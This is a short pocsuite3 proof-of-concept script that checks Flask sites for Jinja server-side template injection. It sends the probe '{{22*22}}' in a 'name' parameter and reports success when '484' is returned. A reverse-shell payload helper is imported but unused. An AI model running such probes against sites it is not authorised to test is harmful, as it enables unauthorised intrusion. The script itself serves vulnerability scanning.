# this poc is used to attack by jinja-flask
from pocsuite3.api import Output,POCBase,register_poc,requests,logger
from pocsuite3.api import get_listener_ip,get_listener_port,REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
class DemoPOC(POCBase):
    vulID = 1
    version = '1.1'
    author = "user"
    vulDate = "0"
    createDate = "0"
    updateDate = "0"
    references = ['flask']
    name = '_python_website_flask_inject_null'
    appPowerLink = 'website'
    appName = 'flask'
    appVersion = 'flask'
    vulType ="CODE_EXECUTION"
    desc = '''
    flask jinja模板语言-命令注入
    
        '''
    samples = []
    category = 1.1
    def _verify(self):
        result = {}
        path = "?name="
        url = self.url + path
        #print(url)
        payload = "{{22*22}}"
        #print(payload)
        try:
            resq = requests.get(url + payload)
            if resq and resq.status_code == 200 and "484" in resq.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Name'] = payload
        except Exception as e:
            return
        return self.parse_output(result)
    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)
